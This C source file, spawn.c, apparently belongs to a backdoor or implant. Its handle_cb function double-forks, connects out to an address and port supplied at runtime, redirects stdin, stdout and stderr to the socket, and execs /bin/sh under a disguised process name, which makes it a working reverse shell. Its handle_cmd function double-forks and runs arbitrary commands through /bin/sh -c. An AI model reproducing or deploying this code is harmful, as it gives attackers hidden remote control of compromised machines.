/*
 * spawn.c
 * Spawn callbacks and commands
 * By J. Stuart McMurray
 * Created 20190321
 * Last Modified 20190322
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "config.h"
#include "debug.h"
#include "doublefork.h"

/* handle_cb double-forks and calls back addr with a shell */
void
handle_cb(char *addr)
{
        struct addrinfo hints, *res, *res0;
        char *port;
        int i, ret, s;

        dbgx("CB: %s", addr);

        /* Make a child */
        if (0 != doublefork()) {
                return;
        }

        /* Find end of string, then backtrack to find the port */
        for (i = 0; '\0' != addr[i]; ++i);
        for (; (':' != addr[i] && '_' != addr[i]) && 0 < i; --i);
        if (0 == i)
                return;
        addr[i] = '\0';
        port = (char *)&(addr[i+1]);

        /* Turn into connectable addresses */
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        if (0 != (ret = getaddrinfo((char *)addr, port, &hints, &res0))) {
                exit(ret);
        }

        /* Try to connect to the addresses we got back, likely just one */
        s = -1;
        for (res = res0; NULL != res; res = res->ai_next) {
                /* Try to make a socket */
                if (-1 == (s = socket(res->ai_family, res->ai_socktype,
                                                res->ai_protocol)))
                        continue;
                /* Try to connect to the address */
                if (-1 == connect(s, res->ai_addr, res->ai_addrlen)) {
                        close(s);
                        s = -1;
                        continue;
                }
                /* Got a connection */
                break;
        }
        if (-1 == s)
                exit(11);
        freeaddrinfo(res0);

        /* Make socket our stdio */
        dup2(s, STDIN_FILENO);
        dup2(s, STDOUT_FILENO);
        dup2(s, STDERR_FILENO);

        /* Close the socket if it's not stdio.  This shouldn't happen. */
        if (s != STDIN_FILENO && s != STDOUT_FILENO && s != STDERR_FILENO)
                close(s);

        /* Exec a shell */
        if (-1 == execl("/bin/sh", CHILDNAME, (char *)NULL))
                exit(12);
}

/* handle_cmd double-forks and executes cmd with /bin/sh -c */
void
handle_cmd(char *cmd)
{
        dbgx("CMD: %s", cmd);

        /* Make a child */
        if (0 != doublefork()) {
                return;
        }

        /* Spawn the child */
        exit(execl("/bin/sh", CHILDNAME, "-c", cmd, (char *)NULL));
}
